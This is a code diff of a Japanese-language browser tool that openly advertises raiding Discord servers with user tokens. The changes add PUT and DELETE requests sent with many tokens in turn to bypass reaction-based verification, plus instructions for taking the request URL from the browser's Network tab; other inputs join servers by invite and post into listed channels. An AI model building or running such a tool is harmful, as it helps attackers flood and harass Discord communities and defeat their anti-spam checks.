@@ -3,7 +3,7 @@
     var h = $("<div>").appendTo($("body").css({
         "text-align": "center"
     }));
-    $("<div>",{text:"最終更新：2020/08/09 1:49"}).appendTo(h);
+    $("<div>",{text:"最終更新：2020/08/09 10:49"}).appendTo(h);
     $("<h1>",{text:"Tokenを使って、Discordの荒らしができます。"}).appendTo(h);
     h.append("Tokenの取得の方法は、");
     $("<a>",{
@@ -55,8 +55,14 @@
     var input_invidedURL = addInput("招待リンク","https://discord.gg/g3Xq7vc");
     addBtn("招待を受ける", enter);
     h.append("<br><br><br>");
-    var input_PUT_URL = addInput("PUT_URL(認証突破用)","https://discord.com/api/v6/channels/741212688579035216/messages/741215711791415307/reactions/%F0%9F%91%8D/%40me");
-    addBtn("PUTリクエスト", send_put);
+    var input_PUT_URL = addInput("リアクションのRequest URL(認証突破用)","https://discord.com/api/v6/channels/741212688579035216/messages/741215711791415307/reactions/%F0%9F%91%8D/%40me");
+    addBtn("PUT(つける)", send_put);
+    addBtn("DELETE(外す)", send_delete);
+    h.append("<br><br><br>");
+    $("<div>",{text:"リアクション形式の認証を突破できます。"}).appendTo(h);
+    $("<div>",{text:"Request URLはリアクションを押したとき、開発者ツールのNetworkタブから取得できます。"}).appendTo(h);
+    $("<div>",{text:"リアクション情報はサーバーから抜けた後も保持されています。"}).appendTo(h);
+    $("<div>",{text:"再度、サーバーに入って認証を受けるとき、一度リアクションを外す必要があります。"}).appendTo(h);
     h.append("<br><br><br>");
     var input_url = addTextarea("発言する場所のURLを改行で区切って入力してください。\nhttps://discordapp.com/channels/635695825405607956/635695825405607958");
     h.append("<br>");
@@ -93,10 +99,24 @@
     // リアクション認証を突破する
     function send_put(){
         var url = input_PUT_URL.val();
-        if(!url) return alert("PUTリクエストのURLを設定してください。");
+        if(!url) return alert("リクエストURLを設定してください。");
         splitLine(input_token.val()).map(function(v,i){
             var xhr = new XMLHttpRequest();
             xhr.open( 'PUT', url );
+            xhr.setRequestHeader( "authorization", v );
+            xhr.setRequestHeader( "content-type", "application/json" );
+            setTimeout(function(){
+                xhr.send();
+            },makeTime(i));
+        });
+    }
+    // リアクション認証を突破する
+    function send_delete(){
+        var url = input_PUT_URL.val();
+        if(!url) return alert("リクエストURLを設定してください。");
+        splitLine(input_token.val()).map(function(v,i){
+            var xhr = new XMLHttpRequest();
+            xhr.open( 'DELETE', url );
             xhr.setRequestHeader( "authorization", v );
             xhr.setRequestHeader( "content-type", "application/json" );
             setTimeout(function(){
